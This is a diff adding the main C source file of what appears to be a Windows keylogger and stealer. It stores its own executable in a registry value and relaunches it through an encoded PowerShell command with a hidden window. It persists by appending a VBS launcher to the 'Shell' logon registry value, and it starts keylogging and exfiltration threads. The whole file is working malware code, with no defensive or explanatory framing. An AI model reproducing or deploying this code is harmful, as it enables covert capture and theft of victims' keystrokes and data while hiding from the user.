@@ -1,0 +1,62 @@
+#include <winsock2.h>
+#include "libs/winexfil.h"
+#include "winconsts.h"
+#include "libs/winkeylog.h"
+#include "libs/winencode.h"
+#include "libs/winvbs.h"
+#include <windows.h>
+#include <stdio.h>
+
+int isInRegistry() {
+    char szPath[MAX_PATH];
+    GetModuleFileNameA(NULL, szPath, MAX_PATH);
+    return (strstr(szPath, "TEMP") != NULL || strstr(szPath, PROC_NAME) != NULL);
+}
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
+    char cmd[512];
+	snprintf(cmd, sizeof(cmd), 
+    	"$b=(Get-ItemProperty 'Registry::%s\\%s').DEBUG;"
+    	"$p=\"$env:TEMP\\%s\";[IO.File]::WriteAllBytes($p,$b);"
+    	"Start-Process $p -WindowStyle Hidden", REG_STR, MAIN_REGISTRY, PROC_NAME);
+	const char* encodedPayload = encodeForPowerShell(cmd);
+    if (isInRegistry()) {
+		if (!hasVBS()) { dropVBS(encodedPayload); }
+        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)logKey, NULL, 0, NULL);
+		HANDLE hExfilThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exfilThread, NULL, 0, NULL);
+		WaitForSingleObject(hThread, INFINITE);
+		return 0;
+	}
+    char szPath[MAX_PATH];
+    GetModuleFileNameA(NULL, szPath, MAX_PATH);
+    FILE* file = fopen(szPath, "rb");
+    if (!file) return 0;
+    fseek(file, 0, SEEK_END);
+    long fileSize = ftell(file);
+    fseek(file, 0, SEEK_SET);
+    unsigned char* buffer = (unsigned char*)malloc(fileSize);
+    fread(buffer, 1, fileSize, file);
+    fclose(file);
+    HKEY hKey;
+    if (RegCreateKeyExA(REG, MAIN_REGISTRY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        RegSetValueExA(hKey, "DEBUG", 0, REG_BINARY, buffer, fileSize);
+        RegCloseKey(hKey);
+    }
+    free(buffer);
+    dropVBS(encodedPayload);
+    char currentShell[512], newShell[1024];
+    DWORD dwSize = sizeof(currentShell);
+    if (RegOpenKeyExA(REG, ACTIVATE_REGISTRY, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
+        if (RegQueryValueExA(hKey, "Shell", NULL, NULL, (LPBYTE)currentShell, &dwSize) == ERROR_SUCCESS) {
+            if (strstr(currentShell, "wininit.ini.vbs") == NULL) {
+                snprintf(newShell, sizeof(newShell), "%s, wscript.exe \"%s\"", currentShell, VBS_PATH);
+                RegSetValueExA(hKey, "Shell", 0, REG_SZ, (const BYTE*)newShell, strlen(newShell) + 1);
+            }
+        }
+        RegCloseKey(hKey);
+    }
+    char vbscmd[MAX_PATH + 30];
+    snprintf(vbscmd, sizeof(vbscmd), "wscript.exe //B \"%s\"", VBS_PATH);
+
+    WinExec(vbscmd, 0);
+    return 0;
+}
